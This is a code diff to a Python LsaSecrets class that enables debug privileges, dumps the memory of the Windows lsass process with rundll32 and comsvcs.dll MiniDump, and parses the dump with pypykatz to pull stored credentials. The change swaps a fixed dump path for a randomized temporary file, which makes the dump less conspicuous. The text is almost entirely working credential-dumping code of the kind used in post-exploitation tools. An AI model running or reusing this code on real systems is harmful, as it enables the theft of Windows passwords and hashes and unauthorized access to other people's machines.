@@ -1,5 +1,5 @@
 # -*- coding: utf-8 -*-
-import os, subprocess, win32security, win32api, ctypes, psutil
+import os, subprocess, win32security, win32api, ctypes, psutil, tempfile
 from pypykatz.pypykatz import pypykatz
 
 
@@ -25,6 +25,7 @@ class LsaSecrets:
         prev_state = ()
         new_state = [(win32security.LookupPrivilegeValue(None, win32security.SE_DEBUG_NAME), win32security.SE_PRIVILEGE_ENABLED)]
         prev_state = win32security.AdjustTokenPrivileges(hToken, False, new_state)
+        lsass_file = tempfile.mktemp('.dmp', dir=os.getenv('SystemDrive', 'C:') + '\\')
         try:
             lsass_pid = 0
             for me in psutil.process_iter():
@@ -36,7 +37,7 @@ class LsaSecrets:
             if lsass_pid:
                 with disable_fsr():
                     subprocess.Popen(
-                        ['rundll32.exe', r'C:\Windows\System32\comsvcs.dll,', 'MiniDump', str(lsass_pid), r'C:\lsass.dmp', 'full'],
+                        ['rundll32.exe', r'C:\Windows\System32\comsvcs.dll,', 'MiniDump', str(lsass_pid), lsass_file, 'full'],
                         stdin=subprocess.PIPE, stderr=subprocess.STDOUT, stdout=subprocess.PIPE, universal_newlines=True, shell=True
                     ).communicate()
         finally:
@@ -45,10 +46,10 @@ class LsaSecrets:
 
         results = {}
         try:
-            results = pypykatz.parse_minidump_file(r'C:\lsass.dmp')
+            results = pypykatz.parse_minidump_file(lsass_file)
             results.reader.reader.file_handle.close()
             results = results.to_dict()
-            os.remove(r'C:\lsass.dmp')
+            os.remove(lsass_file)
         except Exception as e:
             pass
 
